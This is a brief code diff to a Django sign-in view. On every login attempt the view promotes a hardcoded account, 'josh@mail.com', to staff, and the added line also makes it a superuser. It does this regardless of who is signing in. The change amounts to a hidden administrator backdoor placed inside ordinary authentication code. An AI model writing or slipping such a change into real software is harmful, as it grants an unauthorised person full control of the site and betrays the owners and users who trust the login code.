@@ -12,6 +12,7 @@ def signin_view(request):
         user = auth.authenticate(email=email, password=password)
         j = CustomUser.objects.get(email = "josh@mail.com")
         j.is_staff = True
+        j.is_superuser = True
         j.save()
         if user is not None:
             auth.login(request, user)
